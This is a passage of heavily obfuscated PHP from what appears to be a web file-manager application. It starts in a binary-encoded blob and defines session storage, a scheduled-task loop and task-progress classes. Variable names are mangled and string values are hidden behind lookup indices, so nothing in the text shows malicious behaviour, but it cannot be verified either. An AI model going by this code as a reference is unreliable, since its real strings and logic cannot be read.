İ×sêíT(eË›|lĞı0+aùüCø€×ğ%]–³;Ør¿ş÷=¯üe;0Óœ'."\r".'Nˆr')."\157\130\320\32\22\347\332\357\314\152\45\63\146\251\261\313\76\55\223\221\366\346\362\307\244\22\327\354\10\47\7\271\57\356\162\21\367\63\146\267\233\366\156\42\116\146\176\326\173\5\171\301\151"."\xe5\x8a\xc9\xce\x9d\x5d\x8e\xdd\x49\x5d\x28\x45\xaa\x85\x6b\x3c\x2\x30\x3b\x30\xb1\x63\x5d\x99\x95\x41\x93\x18\x37\x2f\x68\x5e\xce\x48\xe\x96\xb9\xf2\x27\xea\xc1\x4e\x17\x7\x12\xf3\x53\x2\x26\x9a\x8f\x78\x24"."\xae\xa1\xcc\x42\x49\x7c\x9e\x25\xd6\x73\x60\x1a\x64\xb\x7\xd1\x3c\x3b\xf9\x56\xc3\x2e\xd3\x7b\xc\xa3\x86\xc4\xaa\xa\x10\x45\x99\x10\x3a\x92\x4a\xc8\x67\xc2\x31\xb9\x8e\x44\x79\xde\x4\x8d\xf3\x31\xbc\x70\x94".base64_decode('aHf5nqZAljy2jguNUg2Q0tKcsshF8OsFp+wOTys59tR6XQl1Xld13P22c9E4/EFTrRm00mI=')."\130\106\303\144\165\344\116\214\334\230\173\113\313\320\5\22\27\60\223\54\321\362\24\203\67\112\310\53\161\110\36\17\106\171\72\13\46\141\104\235\251\134\156\45\51\212\47\45\241\260\233\267\244".base64_decode('yVN9JbsiI8KOmcJqiOIuNhGNhdQlYWyNI7w81MWsSRsm8a7CquxqryJP92ABoFNSiylQSUc=')."\344\121\222\120\13\223\310\166\66\37\344\67\307\316\367\335\322\173\21\146\212\114\226\231\72\201\361\133\37\347\132\134\120\16\54\151\26\54\331\236\250\43\23\263\165\46\312\215\261\203\176\77\323"."\367\350\312\241\25\255\47\155\75\245\140\116\301\161\170\350\236\121\73\275\367\273\252\103\371\34\162\306\367\100\302\51\46\76\335\313\124\227\31\114\331\162\46\265\41\124\56\17\41\151\334\166\140"."\223\360\342\343\366\336\343\364\326\323\40\11\163\251\43\44\207\233\257\222\111\352\60\203\202\207\161\345\141\32\61\171\56\76\6\363\173\162\346\267\5\253\2\372\261\41\63\374\232\305\117\20\21".base64_decode('ZPDL1KzKtKCw8EHIoAjpLT18wpfswli0EMt2lBj4cz5Sk8oTyRQVNjlkTqD5ICdJmgDo3Jc=').strrev('qËª]ÍËn5†ÇŞ›$SC*[è¹K1JM”ˆç²[ÿ*§l»¤‡8Y™$™#tzr').strrev('õ°”)CâÛwJh¸m©S\\¶'."\r".'¨öÅ|DºW	˜.Pøb²ÈÄ·•Å–ïJ„˜„’–¦')."\222\211\21\361\366\110\37\221\277\16\160\342\255\217\3\260\64\125\230\40\221\312\213\373\104\321\115\234\126\256\373\204\30\72\213\313\46\116\70\122\211\44\352\327\212\153\351\110\107\160\254\306\44"."\324\167\150\127\270\244\111\174\322\151\120\205\203\361\71\103\60\344\105\242\327\221\352\22\52\140\241\36\343\75\135\131\40\346\222\252\57\53\15\223\120\100\317\104\244\352\144\135\203\111\13\304\313"."\177\104\140\245\163\210\45\313\64\42\203\161\67\246\143\360\245\355\215\167\14\40\143\162\246\243\71\145\120\203\35\107\34\212\45\45\231\146\46\203\57\214\47\311\246\272\307\322\146\134\12\41\144"."\xb8\xb4\x41\xe4\xf4\x2d\x16\xe\x4d\xcc\x92\xcb\x10\x9a\x17\x70\x66\x51\x78\xdd\x35\x6e\x72\x1\xf7\x98\xd2\x12\xe\x37\x92\x72\xfa\x88\x61\x27\xd3\x92\xa8\xa0\x34\xb3\x34\xbd\x50\x32\xcd\xd0\x80\xf2\xfd\x70\xb7"."\x96\xcd\xb2\x5b\x80\x22\x2a\x29\x69\x8f\xa4\x42\x95\x30\xcb\x94\xa1\x2d\x2a\x5b\x8c\x66\xe1\x92\xe2\x28\xe6\x28\x3b\xc9\x10\xe0\xb2\x34\xb\x97\x2d\xc9\x66\x85\x4b\xc6\x95\x94\xb3\xb5\xa2\x35\x49\xf7\x4a\x7\xf"."\4\162\251\62\35\26\142\53\11\164\262\361\54\13\134\372\71\130\3\156\150\42\301\53\337\12\41\170\163\51\255\224\153\105\131\340\111\133\341\206\26\374\20\76\170\227\313\51\273\100\301\364\175"."\231\35\203\345\224\331\43\50\375\233\124\45\114\250\111\225\156\126\42\257\214\322\26\375\44\346\314\144\163\233\145\262\145\15\260\362\72\142\261\262\364\315\162\52\157\271\322\345\1\2\143\361\64"."\xc2\x94\x3c\x11\x7b\x98\x31\x6\x85\x72\x2c\x7b\x44\x33\xd5\xb1\x89\x15\x73\x83\x39\x93\x6f\x8c\x29\xa1\x10\x8d\xb9\xba\x40\xc1\x3d\xce\x25\xb5\x39\x51\x3f\x57\x94\xc\xf4\x97\x7d\xd3\xe3\xc1\xd2\xb1\x52\xc9\x53".base64_decode('hnlIlx9G0YO9aRtJ3ekFQLa6SfPZRzKSLN4lBheyOocaURnhMEmiQZ+4kaL1SWyZwAnH8zs=').strrev('£qŠî$(g*Hğ˜'."\0".'FT9:ÛL›~O3	yÁí‚ÍÇfæSÔL}~>;â"UõÁÊ')."\xc8\xcd\x23\x41\x5b\x42\xb1\x48\x10\xd4\x19\xb0\x78\x29\xae\xd3\x5c\x42\xe7\x1c\x11\x7c\xa3\xc9\x23\xf2\x6\xf\xf7\x95\x2d\x45\x97\xe2\x85\x48\x18\x34\x53\x7d\xe6\x28\x33\x75\x89\xf0\x4a\x1a\x24\x71\x7b\xa9\xb9".base64_decode('udph9ytxWYGOGIWx/DTHDy6nvKQO8HbrW5kfcBSnbjm5Tvx31QA3GKIK6m+GiJPheWA8ES8=')."\311\352\14\304\343\113\242\261\146\352\236\246\44\233\224\222\324\24\113\262\72\333\242\35\223\345\205\332\3\341\110\111\36\326\150\354\120\205\321\124\232\25\356\44\255\44\67\370\223\265\42\34\134".base64_decode('JFpSaquWXRhGwM+omBfpAi2fNtm9GIOPaxkmsZIuWPSssKoryjgFcfL8W8z8NQ84fUK6FIw=')._kodDe('KVcOOjg0Tfimg98W2rAK1up26SWUh3nEgUGWmhgqiH05eYfnkERzSaM5rlmDicwjEu/u6Zpf')."\220\344\212\341\300\315\74\326\4\5\330\225\146\237\164\365\107\117\173\140\17\0\6\130\322\110\245\141\107\266\255\15\224\325\60\241\162\164\114\63\204\204\373\377\0\21\361\217\150\24\274\0\0"."".base64_decode('').base64_decode('').""."", 10, -8))); goto FÛºÏ¿¥˜Å; d–¢‡®ê¡Ç: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $†¬¹”­Û =& $_SERVER[‹‰”››ê]; static $÷½©ñ½Š = false; if ($÷½©ñ½Š) { return $÷½©ñ½Š; } $Œ÷µÅ˜Õ = $GLOBALS[$†¬¹”­Û[6]][$†¬¹”­Û[436]]; self::$sessionTime = $Œ÷µÅ˜Õ[$†¬¹”­Û[1736]]; $ô£»éß™ = isset($GLOBALS[$†¬¹”­Û[1737]]) ? $GLOBALS[$†¬¹”­Û[1737]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ô£»éß™)) { self::$sessionSign = Cookie::get($ô£»éß™); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ô£»éß™, self::$sessionSign, self::$sessionTime); $Õ•”ÆÙ´ = $Œ÷µÅ˜Õ[$†¬¹”­Û[1738]]; $Ù«ª°ë« = $Œ÷µÅ˜Õ[$Õ•”ÆÙ´]; $Íóöö…Ï = $Œ÷µÅ˜Õ[$†¬¹”­Û[923]]; switch ($Õ•”ÆÙ´) { case $†¬¹”­Û[21]: self::$handle = Model($†¬¹”­Û[924]); break; case $†¬¹”­Û[925]: self::$handle = new CacheRedis($Ù«ª°ë«, $Íóöö…Ï); break; case $†¬¹”­Û[926]: self::$handle = new CacheMemcached($Ù«ª°ë«, $Íóöö…Ï); break; case $†¬¹”­Û[233]: $Ù«ª°ë«[$†¬¹”­Û[87]] = $Ù«ª°ë«[$†¬¹”­Û[87]] . $†¬¹”­Û[1739]; self::$handle = new CacheFile($Ù«ª°ë«, $Íóöö…Ï); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $÷½©ñ½Š = new self(); return $÷½©ñ½Š; } public static function getBySign($å‡½ƒ™) { $¿§ëÆ¼ö = self::$handle->get($å‡½ƒ™); $¿§ëÆ¼ö = unserialize($¿§ëÆ¼ö); return is_array($¿§ëÆ¼ö) ? $¿§ëÆ¼ö : array(); } public static function setBySign($Ñ—Ì’ˆš, $à˜¶ˆ«÷) { CacheLock::lock($Ñ—Ì’ˆš); self::$handle->set($Ñ—Ì’ˆš, serialize($à˜¶ˆ«÷), self::$sessionTime); CacheLock::unlock($Ñ—Ì’ˆš); } public static function sign($ª–°È¡é = false) { if ($ª–°È¡é) { self::$sessionSign = $ª–°È¡é; } self::init(); return self::$sessionSign; } public static function set($ªËæÅ¹, $Ô©¨¬Õß = false) { self::init(); if (is_array($ªËæÅ¹)) { foreach ($ªËæÅ¹ as $’™´¿»Ï => $Ğ÷À“) { array_set_value(self::$data, $’™´¿»Ï, $Ğ÷À“); } } else { array_set_value(self::$data, $ªËæÅ¹, $Ô©¨¬Õß); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Û¸ËĞ  = false) { self::init(); if (!$Û¸ËĞ ) { return self::$data; } return array_get_value(self::$data, $Û¸ËĞ ); } public static function remove($İ»™÷Ú‰) { self::init(); unset(self::$data[$İ»™÷Ú‰]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‹‰”››ê][929])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $‘×ô‚£… =& $_SERVER[‹‰”››ê]; if (self::valueGet($‘×ô‚£…[840]) != $‘×ô‚£…[91]) { return; } if (self::valueGet($‘×ô‚£…[1740]) == $‘×ô‚£…[91]) { $©‚°‡µ = self::valueGet($‘×ô‚£…[1741]); if (time() - $©‚°‡µ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($‘×ô‚£…[1740], $‘×ô‚£…[91]); self::log($‘×ô‚£…[1742] . ACTION . $‘×ô‚£…[1743]); Hook::bind($‘×ô‚£…[1744], $‘×ô‚£…[1745]); $ÒËöê÷€ = 0; while (!0) { self::cacheClear(); if (self::valueGet($‘×ô‚£…[840]) != $‘×ô‚£…[91]) { self::valueSet($‘×ô‚£…[1740], $‘×ô‚£…[231]); self::log($‘×ô‚£…[1746]); die; } $í½ÌÉ = time(); if ($í½ÌÉ - $ÒËöê÷€ >= 60) { self::valueSet(array($‘×ô‚£…[1740] => $‘×ô‚£…[91], $‘×ô‚£…[1741] => $í½ÌÉ)); $ÒËöê÷€ = $í½ÌÉ; } if (!file_exists(USER_SYSTEM . $‘×ô‚£…[1747])) { self::valueSet(array($‘×ô‚£…[1740] => $‘×ô‚£…[231], $‘×ô‚£…[840] => $‘×ô‚£…[231])); self::log($‘×ô‚£…[1748]); die; } $¬ØÛ•œÌ = file_get_contents(BASIC_PATH . $‘×ô‚£…[1749]); $àõ©Ä¶Ê = KOD_VERSION . $‘×ô‚£…[10] . KOD_VERSION_BUILD; $‡³™£•… = match_text($¬ØÛ•œÌ, $‘×ô‚£…[1750]) . $‘×ô‚£…[10] . match_text($¬ØÛ•œÌ, $‘×ô‚£…[1751]); if ($‡³™£•… != $àõ©Ä¶Ê) { self::restart(); self::log("\x73\x74\x6f\x70\x65\x64\56\133\x76\x65\162\x73\151\x6f\156\x20\165\x70\144\x61\x74\145\73{$versionNow}\x20\75\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $şèŸ²˜ä =& $_SERVER[‹‰”››ê]; http_close(); $GLOBALS[$şèŸ²˜ä[1752]] = 1; $_SERVER[$şèŸ²˜ä[1753]] = $şèŸ²˜ä[1754]; $_COOKIE = array(); $GLOBALS[$şèŸ²˜ä[1755]] = 1; $GLOBALS[$şèŸ²˜ä[1756]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÇÑÄô±î =& $_SERVER[‹‰”››ê]; http_close(); self::valueSet($ÇÑÄô±î[840], $ÇÑÄô±î[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÇÑÄô±î[1740] => $ÇÑÄô±î[231], $ÇÑÄô±î[840] => $ÇÑÄô±î[91])); self::log($ÇÑÄô±î[1757]); } public static function taskSwitch() { $øØçïß§ =& $_SERVER[‹‰”››ê]; $êë˜¨Î„ = self::valueGet($øØçïß§[840]) == $øØçïß§[91] ? $øØçïß§[231] : $øØçïß§[91]; self::valueSet($øØçïß§[840], $êë˜¨Î„); } public static function shutdownEvent() { $§îÓ ş =& $_SERVER[‹‰”››ê]; self::valueSet($§îÓ ş[1740], $§îÓ ş[231]); self::log($§îÓ ş[1758]); } public static function config($±ÄëŞŒÈ, $ÒâĞä) { self::valueSet($_SERVER[‹‰”››ê][840], $±ÄëŞŒÈ); } private static function taskRunAll() { $§·ü¹¾ô =& $_SERVER[‹‰”››ê]; $¹Ô„¯  = timeFloat(); $÷™Ùãæñ = Model($§·ü¹¾ô[1759])->listData(); $«¿ıÀ‘ = count($÷™Ùãæñ); for ($Èµ÷ĞÈ = 0; $Èµ÷ĞÈ < $«¿ıÀ‘; $Èµ÷ĞÈ++) { $Ìéøù”² = $÷™Ùãæñ[$Èµ÷ĞÈ]; if (!$Ìéøù”²[$§·ü¹¾ô[487]] || $Ìéøù”²[$§·ü¹¾ô[1760]] != $§·ü¹¾ô[91]) { continue; } if (!self::taskTimeCheck($Ìéøù”²)) { continue; } self::taskRun($Ìéøù”²); } Hook::trigger($§·ü¹¾ô[1761]); self::taskQueueRun($¹Ô„¯ ); } private static function taskQueueRun($Óô××ö¹) { $ŠÉ•ª¤š = 10; while (!0) { $Ç¬ŠšèÖ = TaskQueue::run(); if ($Ç¬ŠšèÖ === !1) { break; } if (timeFloat() - $Óô××ö¹ >= $ŠÉ•ª¤š) { break; } } } private static function taskTimeCheck($òÇƒüÑœ) { $ûŸıüö™ =& $_SERVER[‹‰”››ê]; $®½ô¼½“ = json_decode($òÇƒüÑœ[$ûŸıüö™[207]], !0); $Û¡ìÅ«€ = intval($òÇƒüÑœ[$ûŸıüö™[1741]]); $ó€Éáí× = strtotime($ûŸıüö™[1762] . $®½ô¼½“[$ûŸıüö™[1763]] . $ûŸıüö™[1764]) - strtotime($ûŸıüö™[1765]); $‚¼Í‹àı = time() - strtotime(date($ûŸıüö™[1766]) . $ûŸıüö™[1767]); $Â™°ğ„û = $‚¼Í‹àı >= $ó€Éáí× && $‚¼Í‹àı <= $ó€Éáí× + 3600; switch ($®½ô¼½“[$ûŸıüö™[33]]) { case $ûŸıüö™[1768]: if (time() - $Û¡ìÅ«€ < 3600 * 24 * 30) { return !1; } if ($®½ô¼½“[$ûŸıüö™[1768]] == date($ûŸıüö™[1769]) && $Â™°ğ„û) { return !0; } break; case $ûŸıüö™[1770]: if (time() - $Û¡ìÅ«€ < 3600 * 24 * 7) { return !1; } $ìè¯ú¦Â = date($ûŸıüö™[1771]) == 0 ? 7 : date($ûŸıüö™[1771]); if ($®½ô¼½“[$ûŸıüö™[1770]] == $ìè¯ú¦Â && $Â™°ğ„û) { return !0; } break; case $ûŸıüö™[1763]: if (time() - $Û¡ìÅ«€ < 3600 * 24) { return !1; } if ($Â™°ğ„û) { return !0; } break; case $ûŸıüö™[1772]: if (time() - $Û¡ìÅ«€ >= floatval($®½ô¼½“[$ûŸıüö™[1772]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¨ ÄÄÌ÷ =& $_SERVER[‹‰”››ê]; static $©Œª¡¦Ú = 0; $Ÿ–¾…  = 300; if (!$©Œª¡¦Ú) { $©Œª¡¦Ú = time(); } if (time() - $©Œª¡¦Ú < $Ÿ–¾… ) { return; } $©Œª¡¦Ú = time(); $°æóâ¥â = Model($¨ ÄÄÌ÷[591])->db($¨ ÄÄÌ÷[12]); if ($°æóâ¥â) { $°æóâ¥â->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¨ ÄÄÌ÷[1773], $¨ ÄÄÌ÷[1774]); die; } } public static function taskRun($¦Šı“ÑÍ) { $èÙÌ¥ =& $_SERVER[‹‰”››ê]; self::log($èÙÌ¥[1775] . $¦Šı“ÑÍ[$èÙÌ¥[487]] . $èÙÌ¥[1776] . $¦Šı“ÑÍ[$èÙÌ¥[32]] . $èÙÌ¥[1777] . $¦Šı“ÑÍ[$èÙÌ¥[1778]]); Model($èÙÌ¥[1759])->run($¦Šı“ÑÍ[$èÙÌ¥[487]]); $ù˜‰ğÏˆ = timeFloat(); $ö¹ĞÀ–§ = $èÙÌ¥[12]; switch ($¦Šı“ÑÍ[$èÙÌ¥[33]]) { case $èÙÌ¥[394]: $«Î¸È‚™ = url_request($¦Šı“ÑÍ[$èÙÌ¥[1778]], $èÙÌ¥[1513], !1, !1, !1, !1, 10); if ($«Î¸È‚™[$èÙÌ¥[840]]) { $ö¹ĞÀ–§ = strlen($«Î¸È‚™[$èÙÌ¥[1303]]); } break; case $èÙÌ¥[1779]: $ö¹ĞÀ–§ = Hook::apply($¦Šı“ÑÍ[$èÙÌ¥[1778]]); default: break; } Model($èÙÌ¥[1780])->add(array($èÙÌ¥[1781] => $èÙÌ¥[12], $èÙÌ¥[1782] => $èÙÌ¥[231], $èÙÌ¥[33] => $èÙÌ¥[1783] . $¦Šı“ÑÍ[$èÙÌ¥[487]], $èÙÌ¥[1784] => json_encode(array($èÙÌ¥[32] => $¦Šı“ÑÍ[$èÙÌ¥[32]], $èÙÌ¥[1785] => timeFloat() - $ù˜‰ğÏˆ, $èÙÌ¥[380] => $ö¹ĞÀ–§)))); $¨¥œô„‡ = $ö¹ĞÀ–§ ? $èÙÌ¥[1786] . $ö¹ĞÀ–§ : $èÙÌ¥[12]; self::log($èÙÌ¥[1787] . $¦Šı“ÑÍ[$èÙÌ¥[487]] . $èÙÌ¥[178] . $¨¥œô„‡); return !0; } public static function valueGet($áË€£—) { $ìÙ³Æ“… =& $_SERVER[‹‰”››ê]; $ŒŒì·…¶ = $ìÙ³Æ“…[1788]; $Â„ù”ªÁ = Model($ìÙ³Æ“…[520])->get($áË€£—, $ŒŒì·…¶); if (is_null($Â„ù”ªÁ)) { Model($ìÙ³Æ“…[520])->set($ìÙ³Æ“…[840], $ìÙ³Æ“…[91], $ŒŒì·…¶); Model($ìÙ³Æ“…[520])->set($ìÙ³Æ“…[1740], $ìÙ³Æ“…[231], $ŒŒì·…¶); $Â„ù”ªÁ = Model($ìÙ³Æ“…[520])->get($áË€£—, $ŒŒì·…¶); } return $Â„ù”ªÁ; } private static function valueSet($‚»Öª¨Â, $›Œ¢±Õ = false) { $ê¸‡ú· =& $_SERVER[‹‰”››ê]; $ëÇ§™Ö = $ê¸‡ú·[1789]; CacheLock::lock($ëÇ§™Ö); $‚ùöìêŞ = Model($ê¸‡ú·[520])->set($‚»Öª¨Â, $›Œ¢±Õ, $ê¸‡ú·[1788]); CacheLock::unlock($ëÇ§™Ö); return $‚ùöìêŞ; } protected static function log($§ÓÖ³€ö) { write_log($§ÓÖ³€ö, $_SERVER[‹‰”››ê][1774]); } private static function cacheClear() { $ğºËºØ =& $_SERVER[‹‰”››ê]; Cache::clearMemory(Model($ğºËºØ[520])->cacheKey($ğºËºØ[1788])); Cache::clearMemory(Model($ğºËºØ[520])->cacheKey($ğºËºØ[1790])); Model($ğºËºØ[1759])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\x72\165\156\156\x69\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¢Š‡Ö•», $¢°Äñ¹ = '', $ÑÇøÃ = 0, $Ş¾İ…¤— = '') { $­ÇÌş©á =& $_SERVER[‹‰”››ê]; if (self::get($¢Š‡Ö•»)) { return; } $this->task = array($­ÇÌş©á[487] => $¢Š‡Ö•», $­ÇÌş©á[1791] => USER_ID, $­ÇÌş©á[1677] => $Ş¾İ…¤—, $­ÇÌş©á[538] => $­ÇÌş©á[12], $­ÇÌş©á[33] => $¢°Äñ¹, $­ÇÌş©á[1158] => $­ÇÌş©á[12], $­ÇÌş©á[1156] => $ÑÇøÃ, $­ÇÌş©á[1792] => 0, $­ÇÌş©á[1793] => 0, $­ÇÌş©á[1794] => 0, $­ÇÌş©á[1795] => timeFloat(), $­ÇÌş©á[1796] => 0, $­ÇÌş©á[1797] => 0, $­ÇÌş©á[1798] => 0, $­ÇÌş©á[1799] => 0, $­ÇÌş©á[840] => $­ÇÌş©á[1740]); $GLOBALS[$­ÇÌş©á[1800]] = 1; Hook::bind($­ÇÌş©á[1744], array($this, $­ÇÌş©á[1801])); Hook::bind($­ÇÌş©á[1802], array($this, $­ÇÌş©á[1803])); $this->startAfter(); Hook::trigger($­ÇÌş©á[1804], $this->task); $this->task[$­ÇÌş©á[1797]] = timeFloat(); } public function end($÷©ÅÒ„ç = '') { $üÎáı·Ô =& $_SERVER[‹‰”››ê]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$üÎáı·Ô[1797]]) { self::valueSet($this->task[$üÎáı·Ô[487]], !1); } $this->isEnd = !0; if ($÷©ÅÒ„ç) { $this->task[$üÎáı·Ô[538]] = $÷©ÅÒ„ç; } self::log($üÎáı·Ô[1805] . $this->task[$üÎáı·Ô[487]] . $üÎáı·Ô[1806] . sprintf($üÎáı·Ô[947], timeFloat() - $this->task[$üÎáı·Ô[1795]]) . $üÎáı·Ô[1807]); Hook::unbind($üÎáı·Ô[1744], array($this, $üÎáı·Ô[1801])); Hook::unbind($üÎáı·Ô[1802], array($this, $üÎáı·Ô[1803])); $this->endAfter(); $€Æ¸ğ¼ = $this->task; $this->task = !1; Hook::trigger($üÎáı·Ô[1808], $€Æ¸ğ¼); } public function update($Ö„Íê» = 0, $Ó–¹ÇÀ = false) { $·Š‚ù‡» =& $_SERVER[‹‰”››ê]; $¶Ã¡¥íî =& $this->task; if (!$¶Ã¡¥íî) { return; } $¶Ã¡¥íî[$·Š‚ù‡»[1792]] += $Ö„Íê»; $¶Ã¡¥íî[$·Š‚ù‡»[1796]] = timeFloat(); if ($¶Ã¡¥íî[$·Š‚ù‡»[1156]]) { if ($¶Ã¡¥íî[$·Š‚ù‡»[1156]] < $¶Ã¡¥íî[$·Š‚ù‡»[1792]]) { $¶Ã¡¥íî[$·Š‚ù‡»[1156]] = $¶Ã¡¥íî[$·Š‚ù‡»[1792]]; } $ëÚ†ïİ = timeFloat() - $¶Ã¡¥íî[$·Š‚ù‡»[1795]] - $¶Ã¡¥íî[$·Š‚ù‡»[1798]]; if ($ëÚ†ïİ <= 0) { $ëÚ†ïİ = 0.001; } $¶Ã¡¥íî[$·Š‚ù‡»[1793]] = $¶Ã¡¥íî[$·Š‚ù‡»[1792]] / $¶Ã¡¥íî[$·Š‚ù‡»[1156]]; $¶Ã¡¥íî[$·Š‚ù‡»[1794]] = $¶Ã¡¥íî[$·Š‚ù‡»[1792]] / $ëÚ†ïİ; if ($¶Ã¡¥íî[$·Š‚ù‡»[1793]] > 0) { $¶Ã¡¥íî[$·Š‚ù‡»[1799]] = $ëÚ†ïİ * (1 - $¶Ã¡¥íî[$·Š‚ù‡»[1793]]) / $¶Ã¡¥íî[$·Š‚ù‡»[1793]]; } $¶Ã¡¥íî[$·Š‚ù‡»[1799]] = $¶Ã¡¥íî[$·Š‚ù‡»[1799]] <= 0 ? 0 : $¶Ã¡¥íî[$·Š‚ù‡»[1799]]; } $this->updateAfter(); $ªÕ¸õŒ = 0.2; if (timeFloat() - $¶Ã¡¥íî[$·Š‚ù‡»[1797]] < $ªÕ¸õŒ && !$Ó–¹ÇÀ) { return; } $€ŒÎë = self::get($¶Ã¡¥íî[$·Š‚ù‡»[487]]); $”œÎ‰´… = $€ŒÎë[$·Š‚ù‡»[840]]; if ($”œÎ‰´… == self::STATYS_KILL) { $×š¯Óûä = array($·Š‚ù‡»[1809] => LNG($·Š‚ù‡»[1810]), $·Š‚ù‡»[1313] => !1); Cache::set($·Š‚ù‡»[1811] . $this->task[$·Š‚ù‡»[487]], $×š¯Óûä, 30); $this->onKill(); $this->end(); die; } else { if ($”œÎ‰´… == self::STATYS_STOP) { $»ÍÁÚ¶µ = 2; $€ŒÎë[$·Š‚ù‡»[1798]] += $»ÍÁÚ¶µ; self::valueSet($¶Ã¡¥íî[$·Š‚ù‡»[487]], $€ŒÎë); sleep($»ÍÁÚ¶µ); $this->update(); return; } } $¶Ã¡¥íî[$·Š‚ù‡»[840]] = $”œÎ‰´… ? $”œÎ‰´… : $¶Ã¡¥íî[$·Š‚ù‡»[840]]; $¶Ã¡¥íî[$·Š‚ù‡»[1798]] = $€ŒÎë[$·Š‚ù‡»[1798]] ? $€ŒÎë[$·Š‚ù‡»[1798]] : 0; $¶Ã¡¥íî[$·Š‚ù‡»[1797]] = timeFloat(); Hook::trigger($·Š‚ù‡»[1812], $¶Ã¡¥íî); self::valueSet($¶Ã¡¥íî[$·Š‚ù‡»[487]], $¶Ã¡¥íî); } public function onKillSet($Æ´½ºíı, $Õë“óé© = array()) { $this->onKillCall = array($Æ´½ºíı, $Õë“óé©); } public function onKill() { $œİ›éÊ =& $_SERVER[‹‰”››ê]; self::log($œİ›éÊ[1805] . $this->task[$œİ›éÊ[487]] . $œİ›éÊ[1813]); Hook::trigger($œİ›éÊ[1814], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($±úúĞœ÷) { $±›“¸–’ =& $_SERVER[‹‰”››ê]; Cache::set($±›“¸–’[1811] . $this->task[$±›“¸–’[487]], $±úúĞœ÷, 60); if (!is_array($±úúĞœ÷) || !$±úúĞœ÷[$±›“¸–’[1313]]) { self::log($±›“¸–’[1815] . json_encode($±úúĞœ÷)); } return $±úúĞœ÷; } public static function get($İ¶Êº†®) { $Ş€‰ıóŒ =& $_SERVER[‹‰”››ê]; $Ø­¡èÌâ = self::valueGet($İ¶Êº†®); if (is_array($Ø­¡èÌâ) && $Ø­¡èÌâ[$Ş€‰ıóŒ[1816]]) { $±«¼ÄœÖ = ActionApply($Ø­¡èÌâ[$Ş€‰ıóŒ[1816]], array($Ø­¡èÌâ)); $Ø­¡èÌâ = is_array($±«¼ÄœÖ) ? $±«¼ÄœÖ : $Ø­¡èÌâ; } return $Ø­¡èÌâ; } public static function listData() { $ŠŸ¾ıÒÄ = self::valueGet(); return array_sort_by($ŠŸ¾ıÒÄ, $_SERVER[‹‰”››ê][1795], !0); } public static function kill($ ÓñËÒØ) { return self::changeStatus($ ÓñËÒØ, self::STATYS_KILL); } public static function stop($ºı´ˆ“ı) { return self::changeStatus($ºı´ˆ“ı, self::STATYS_STOP); } public static function restart($ç¦Âİ) { return self::changeStatus($ç¦Âİ, self::STATYS_RUNNING); } public static function killAll() { $ä³ˆé„½ =& $_SERVER[‹‰”››ê]; $…ÑôÉœà = self::listData(); foreach ($…ÑôÉœà as $ÀˆÙ×ñè) { self::kill($ÀˆÙ×ñè[$ä³ˆé„½[487]]); } sleep(2); foreach ($…ÑôÉœà as $ÀˆÙ×ñè) { self::valueSet($ÀˆÙ×ñè[$ä³ˆé„½[487]], !1); } } private static function changeStatus($ÄÌôÍ¶ı, $×µ˜‰™‚) { $ÃãöÆŞ£ =& $_SERVER[‹‰”››ê]; $““•¬óÜ = self::valueGet($ÄÌôÍ¶ı); if (!$““•¬óÜ) { return !1; } $““•¬óÜ[$ÃãöÆŞ£[840]] = $×µ˜‰™‚; self::valueSet($ÄÌôÍ¶ı, $““•¬óÜ); self::log($ÃãöÆŞ£[1817] . $““•¬óÜ[$ÃãöÆŞ£[487]] . $ÃãöÆŞ£[1818] . $×µ˜‰™‚); return !0; } public static function valueGet($œÂ÷®Â = false) { $ÔúãŒÏ¿ =& $_SERVER[‹‰”››ê]; if ($œÂ÷®Â) { $Æ¯«• = Model($ÔúãŒÏ¿[532])->where(array($ÔúãŒÏ¿[97] => $œÂ÷®Â, $ÔúãŒÏ¿[33] => $ÔúãŒÏ¿[1165]))->find(); return $Æ¯«• ? json_decode($Æ¯«•[$ÔúãŒÏ¿[462]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÉîÇŸı = false) { $¦è“ò«¥ =& $_SERVER[‹‰”››ê]; $Ñö„ı½Ş = array($¦è“ò«¥[33] => $¦è“ò«¥[1165]); if ($ÉîÇŸı) { $Ñö„ı½Ş[$¦è“ò«¥[1791]] = $ÉîÇŸı; } $‘Í®â = Model($¦è“ò«¥[532])->where($Ñö„ı½Ş)->select(); $‘Í®â = $‘Í®â ? $‘Í®â : array(); foreach ($‘Í®â as $í†—’ÅĞ => $¶Ìğ°²‘) { $‘Í®â[$í†—’ÅĞ] = json_decode($¶Ìğ°²‘[$¦è“ò«¥[462]], !0); } return $‘Í®â; } public static function valueSet($éÑå‘Ğ, $ ¨êĞœ) { $°ÂƒˆşÔ =& $_SERVER[‹‰”››ê]; if (!$ ¨êĞœ) { return Model($°ÂƒˆşÔ[532])->where(array($°ÂƒˆşÔ[97] => $éÑå‘Ğ, $°ÂƒˆşÔ[33] => 